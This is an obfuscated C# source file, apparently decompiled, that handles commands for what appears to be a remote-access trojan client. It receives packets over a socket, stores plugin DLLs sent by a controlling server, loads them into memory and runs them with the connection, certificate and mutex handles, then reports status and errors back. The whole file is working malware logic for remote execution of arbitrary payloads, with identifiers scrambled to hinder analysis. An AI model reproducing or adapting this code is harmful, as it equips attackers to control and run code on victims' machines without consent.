using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using TWpTmyPaElwafc;
using XQTTiTqzQXXI;
using YDfIqHIitkNiPV;
using ktQiwKnbqDow;

namespace rKqbOBEzRh;

public static class AyjlGwqvgbad
{
	[CompilerGenerated]
	private static class ptZJbVfYCpziHErw
	{
		public static CallSite<Action<CallSite, object, Socket, X509Certificate2, string, byte[], Mutex, string, string, string>> DcRlWWoWTtvk;
	}

	public static List<UsnwLsVggjVevszVi> iCdcPxlxUpZVHVGBZ = new List<UsnwLsVggjVevszVi>();

	public static void BbkzCplAcfvVI(object FjrUEZTSIOXjodbM)
	{
		try
		{
			UsnwLsVggjVevszVi usnwLsVggjVevszVi = new UsnwLsVggjVevszVi();
			usnwLsVggjVevszVi.hyZPpWPFHEd((byte[])FjrUEZTSIOXjodbM);
			switch (usnwLsVggjVevszVi.twuQjjnvvWt("Packet").dQdRsEbxlbxwL)
			{
			case "savePlugin":
				IPeDFXaHDWQ.tExVPMaUfS(usnwLsVggjVevszVi.twuQjjnvvWt("Hash").dQdRsEbxlbxwL, usnwLsVggjVevszVi.twuQjjnvvWt("Dll").amgfTLPMTM());
				{
					foreach (UsnwLsVggjVevszVi item in iCdcPxlxUpZVHVGBZ.ToList())
					{
						if (item.twuQjjnvvWt("Dll").dQdRsEbxlbxwL == usnwLsVggjVevszVi.twuQjjnvvWt("Hash").dQdRsEbxlbxwL)
						{
							mJnXmcqicsyq(item);
							iCdcPxlxUpZVHVGBZ.Remove(item);
						}
					}
					break;
				}
			case "plugin":
				try
				{
					if (IPeDFXaHDWQ.uuBNtWKxHqnXlwdl(usnwLsVggjVevszVi.twuQjjnvvWt("Dll").dQdRsEbxlbxwL) == null)
					{
						iCdcPxlxUpZVHVGBZ.Add(usnwLsVggjVevszVi);
						UsnwLsVggjVevszVi usnwLsVggjVevszVi3 = new UsnwLsVggjVevszVi();
						usnwLsVggjVevszVi3.twuQjjnvvWt("Packet").ywqmmgHQwlnV("sendPlugin");
						usnwLsVggjVevszVi3.twuQjjnvvWt("Hashes").ywqmmgHQwlnV(usnwLsVggjVevszVi.twuQjjnvvWt("Dll").dQdRsEbxlbxwL);
						pWNWCMPowAyznM.vhbpvHrZScvimg(usnwLsVggjVevszVi3.mTRfDZbSUzkmH());
					}
					else
					{
						mJnXmcqicsyq(usnwLsVggjVevszVi);
					}
					break;
				}
				catch (Exception ex)
				{
					VyXvgDdgmLoO(ex.Message);
					break;
				}
			case "pong":
			{
				pWNWCMPowAyznM.EkPZZPZxPeHF = false;
				UsnwLsVggjVevszVi usnwLsVggjVevszVi2 = new UsnwLsVggjVevszVi();
				usnwLsVggjVevszVi2.twuQjjnvvWt("Packet").ywqmmgHQwlnV("pong");
				usnwLsVggjVevszVi2.twuQjjnvvWt("Message").kbhSzVQmmGYe(pWNWCMPowAyznM.aHArDdXVSgN);
				pWNWCMPowAyznM.vhbpvHrZScvimg(usnwLsVggjVevszVi2.mTRfDZbSUzkmH());
				pWNWCMPowAyznM.aHArDdXVSgN = 0;
				break;
			}
			}
		}
		catch (Exception ex2)
		{
			VyXvgDdgmLoO(ex2.Message);
		}
	}

	private static void mJnXmcqicsyq(UsnwLsVggjVevszVi VJCCienusRd)
	{
		dynamic val = Activator.CreateInstance(AppDomain.CurrentDomain.Load(xbfXshnVCPifH.emiUIBjFUmzH(IPeDFXaHDWQ.uuBNtWKxHqnXlwdl(VJCCienusRd.twuQjjnvvWt("Dll").dQdRsEbxlbxwL))).GetType("Plugin.Plugin"));
		val.Run(pWNWCMPowAyznM.laBUOXnieOGoz, OOyHmWyLirxV.OxzbTkIXfgdBL, OOyHmWyLirxV.bRvphStTyKGSHuM, VJCCienusRd.twuQjjnvvWt("Msgpack").amgfTLPMTM(), HxRxFLpyqtetS.wVqZgZuxKZHIEKcN, OOyHmWyLirxV.wIrhPPSQOtT, OOyHmWyLirxV.WJhVBImPnj, OOyHmWyLirxV.JwRzPIHvNkZg);
		yeFaYteIxZR();
	}

	private static void yeFaYteIxZR()
	{
		UsnwLsVggjVevszVi usnwLsVggjVevszVi = new UsnwLsVggjVevszVi();
		usnwLsVggjVevszVi.twuQjjnvvWt("Packet").dQdRsEbxlbxwL = "Received";
		pWNWCMPowAyznM.vhbpvHrZScvimg(usnwLsVggjVevszVi.mTRfDZbSUzkmH());
		Thread.Sleep(1000);
	}

	public static void VyXvgDdgmLoO(string RplFwcMlTDlS)
	{
		UsnwLsVggjVevszVi usnwLsVggjVevszVi = new UsnwLsVggjVevszVi();
		usnwLsVggjVevszVi.twuQjjnvvWt("Packet").dQdRsEbxlbxwL = "Error";
		usnwLsVggjVevszVi.twuQjjnvvWt("Error").dQdRsEbxlbxwL = RplFwcMlTDlS;
		pWNWCMPowAyznM.vhbpvHrZScvimg(usnwLsVggjVevszVi.mTRfDZbSUzkmH());
	}
}
